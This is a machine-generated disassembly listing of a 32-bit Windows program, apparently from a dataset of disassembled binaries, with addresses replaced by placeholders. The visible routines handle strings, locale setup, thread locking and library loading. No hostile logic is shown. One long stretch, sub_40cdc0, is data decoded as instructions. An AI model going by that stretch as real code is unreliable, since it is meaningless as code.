mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_404138
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40bf2c
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40bf2c
dec eax
mov ebx eax
sub_40be04
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404138
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40bd74
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_404138
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40be68
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404138
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_404138
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40bd74
mov eax esi
call sub_404138
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_404138
mov [ esp ] eax
jmp r-xdata
sub_40bef0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_404338
add eax esi
dec eax
call sub_40bec8
sub_40bf2c
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_404338
add eax ebx
dec eax
call sub_40bec8
add eax ebx
sub_40bf68
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_404338
push eax
mov eax esi
call sub_404338
mov ebp eax
mov eax ebp
pop edx
call sub_40c02c
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40bfa0
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_407bb0
mov eax esi
call sub_404138
mov ebp eax
mov eax edi
mov edx ebp
call sub_4044c4
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_404344
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_404344
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_404344
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40c02c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_4083bc
mov [ esp ] eax
mov eax ebp
call sub_4083bc
mov edi eax
mov edx ebp
mov eax esi
call sub_408554
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40bcdc
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408554
mov ebx eax
inc ebx
sub_40c0cc
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c0f4
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c0f4
test eax eax
jne r-xdata
sub_40c0f4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408540
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40bcdc
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408540
mov edi eax
test edi edi
jne r-xdata
sub_40c134
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c198
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_4040e8
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_407f04
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c19f
lea eax [ ebp - 0xc ]
call sub_403e78
retn
sub_40c1a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c134
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c220
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c208
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c1a8
pop ecx
push ebp
call sub_40c1a8
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402c60
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c394
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40c65f
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c220
call sub_40abf8
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40ab48
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403ecc
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40ab48
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_407f04
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40ab48
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_407f04
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40ab94
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40ab94
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40ab48
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_407f04
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40ab94
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40ab48
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40ae80
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403ecc
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40ab48
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40ae80
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403ecc
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40ab94
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40ab48
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403ecc
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40ab48
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403ecc
lea eax [ ebp - 0x8 ]
call sub_403e78
lea eax [ ebp - 0xc ]
call sub_403e78
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40ab48
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_407f04
test eax eax
jne r-xdata
call sub_40add0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f10
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f10
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4041f8
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4041f8
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40ab94
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c666
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403e9c
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40ab48
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_407f04
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40ab48
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_407f04
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_403f10
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_403f10
jmp r-xdata
sub_40c714
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40c7a4
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40aafc
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3fc
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_4038b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c7ab
lea eax [ ebp - 0x14 ]
call sub_403e78
retn
sub_40c7fc
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_408348
mov [ rw-data ] eax
sub_40c880
push ebx
push esi
push edi
push ebp
call sub_4034b4
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4026dc
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403118
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40349c
sub_40c8e8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40c8d0
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40c970
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_4079b8
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40c870
mov [ ebp ] eax
sub_40c970
push ebx
mov ebx eax
mov eax ebx
call sub_40c8d0
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40c870
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40c9b0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_40ca24
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax esi
call sub_40cab0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403128
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_40cab0
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40ca6c
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40c8e8
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40c878
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40c858
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40c878
test eax eax
je r-xdata
mov eax edi
call sub_40ca6c
test bl bl
je r-xdata
mov eax edi
call sub_40caa0
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40c858
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40c864
sub_40cb4c
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c8e8
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40c878
mov eax ebx
call sub_40ca84
mov eax ebx
call sub_40ca78
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c960
sub_40cb9c
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40c8e8
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40ca90
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40c864
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40c858
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40ca90
mov eax esi
call sub_40ca84
sub_40cc08
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c8e8
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c960
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40c858
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40ca84
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40ca84
sub_40cc80
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40cca4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40cd1b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_4054b4
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_4031dc
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cd22
lea eax [ ebp - 0x4 ]
call sub_4054b4
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_4031dc
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40cc80
test al al
jne r-xdata
mov al 0x1
sub_40cd3c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40cdae
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40cd90
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404338
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cd97
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40cdc0
sbb eax 0x4000000
mov [ 0xffffffffb0a40046 ] eax
inc esi
add ah bh
mov [ 0xffffffffafc40046 ] al
inc esi
add ah dh
mov [ 0xffffffffae380046 ] al
inc esi
add ah ch
mov [ 0xffffffffb0f00046 ] al
inc esi
add ah ah
mov [ 0xffffffffb1200046 ] al
inc esi
add ah bl
mov [ 0xffffffffaef80046 ] al
inc esi
add ah dl
mov [ 0xffffffffafac0046 ] al
inc esi
add ah cl
mov [ 0xffffffffadfc0046 ] al
inc esi
add ah al
mov [ 0xffffffffaff80046 ] al
inc esi
add [ edx - 0x4fbbffba ] bh
inc esi
add [ edx - 0x507fffba ] dh
inc esi
add [ edx - 0x5077ffba ] ch
inc esi
add [ edx - 0x4e77ffba ] ah
inc esi
add [ edx - 0x507bffba ] bl
inc esi
add [ edx - 0x4dffffba ] dl
inc esi
add [ edx - 0x4f7fffba ] cl
inc esi
add [ edx - 0x4fa3ffba ] al
inc esi
add [ edx + 0x46 ] bh
add [ eax ] bl
mov dl 0x46
add [ edx + 0x46 ] dh
add al cl
mov cl 0x46
add [ edx + 0x46 ] ch
add [ eax + 0x640046af ] bl
mov [ 0xffffffffb1900046 ] al
inc esi
add [ edx + 0x46 ] bl
add [ eax + 0x540046b1 ] ah
mov [ 0xffffffffaee00046 ] al
inc esi
add [ edx + 0x46 ] cl
add [ eax + 0x440046ae ] bl
mov [ 0xffffffffb0580046 ] al
inc esi
add [ edx ] bh
inc esi
add al ch
mov al 0x46
add [ edx ] dh
inc esi
add [ eax ] cl
scasb [ edi ]
inc esi
add [ edx ] ch
inc esi
add [ ecx + esi * 4 - 0x5ddbffba ] al
inc esi
add [ edi + ebp * 4 + 0x280046 ] dl
add [ eax ] al
sbb al 0xa2
inc esi
add [ eax - 0x4f ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] bl
mov [ 0xffffffffae440046 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ edx ] dl
inc esi
add al bl
mov al 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] dl
mov [ 0xffffffffae140046 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ edx ] cl
inc esi
add [ esi + ebp * 4 + 0x46 ] dh
add [ eax ] al
or [ edx - 0x5153ffba ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ edx ] al
inc esi
add [ esi + ebp * 4 + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ 0xffffffffaf900046 ] al
inc esi
add [ eax ] al
add [ eax ] al
add ah bh
mov eax [ 0xffffffffb07c0046 ]
inc esi
add [ eax ] al
add [ eax ] al
add al bh
mov eax [ 0xffffffffaeb00046 ]
inc esi
add [ eax ] al
add [ eax ] al
add ah dh
mov eax [ 0xffffffffb0500046 ]
inc esi
add [ eax ] al
add [ eax ] al
add al dh
mov eax [ 0xffffffffb11c0046 ]
inc esi
add [ eax ] al
add [ eax ] al
add ah ch
mov eax [ 0xffffffffb10c0046 ]
inc esi
add [ eax ] al
add [ eax ] al
add al ch
mov eax [ 0xffffffffb0940046 ]
inc esi
add [ eax ] al
add [ eax ] al
add ah ah
mov eax [ 0xffffffffaf7c0046 ]
inc esi
add [ eax ] al
add [ eax ] al
add al ah
mov eax [ 0xffffffffaf2c0046 ]
inc esi
add [ eax ] al
add [ eax ] al
add ah bl
mov eax [ 0xffffffffae100046 ]
inc esi
add [ eax ] al
add [ eax ] al
add al bl
mov eax [ 0xffffffffb1080046 ]
inc esi
add [ eax ] al
add [ eax ] al
add ah dl
mov eax [ 0xffffffffb0240046 ]
inc esi
add [ eax ] al
add [ eax ] al
add al dl
mov eax [ 0xffffffffaf1c0046 ]
inc esi
add [ eax ] al
add [ eax ] al
add ah cl
mov eax [ 0xffffffffaff40046 ]
inc esi
add [ eax ] al
add [ eax ] al
add al cl
mov eax [ 0xffffffffb0680046 ]
inc esi
add [ eax ] al
add [ eax ] al
add ah al
mov eax [ 0xffffffffb00c0046 ]
inc esi
add [ eax ] al
add [ eax ] al
add al al
mov eax [ 0xffffffffaf500046 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x51f3ffba ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x47ffb95f ] bh
scasd [ edi ]
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x4e57ffba ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x500046a1 ] dh
mov cl 0x46
add [ eax ] al
add [ eax ] al
add [ ecx - 0x4fb3ffba ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x23ffb95f ] ch
scasb [ edi ]
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x51dbffba ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x440046a1 ] ah
mov cl 0x46
add [ eax ] al
add [ eax ] al
add [ ecx - 0x4dc3ffba ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x640046a1 ] bl
scasb [ edi ]
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x5207ffba ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x780046a1 ] dl
mov cl 0x46
add [ eax ] al
add [ eax ] al
add [ ecx - 0x4fb7ffba ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x1fffb95f ] cl
mov cl 0x46
add [ eax ] al
add [ eax ] al
add [ ecx + 0x46 ] ah
add [ eax + 0x46af ] ah
add [ eax ] al
add [ eax - 0x5f ] ah
inc esi
add ah ch
scasb [ edi ]
inc esi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_40d205
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d20c
retn
mov eax rw-data
call sub_40cc70
call sub_40c7dc
call sub_40ba44
mov eax rw-data
mov ecx 0x16
mov edx [ sub_40b51c ]
call sub_4048f4
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_4048f4
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4048f4
mov eax rw-data
call sub_403e78
mov eax rw-data
mov edx [ r-xdata ]
call sub_404e08
mov eax rw-data
mov edx [ r-xdata ]
call sub_404e08
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_4048f4
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_4048f4
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_4048f4
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_4048f4
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_4048f4
mov eax rw-data
call sub_403e78
mov eax rw-data
call sub_403e78
mov eax rw-data
call sub_403e78
mov eax rw-data
call sub_403e78
mov eax rw-data
call sub_403e78
mov eax rw-data
call sub_403e78
mov eax rw-data
call sub_403e78
mov eax rw-data
call sub_403e78
mov eax rw-data
call sub_404558
mov eax rw-data
call sub_403e78
sub_40d210
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d278
push [ fs : eax ]
mov [ fs : eax ] esp
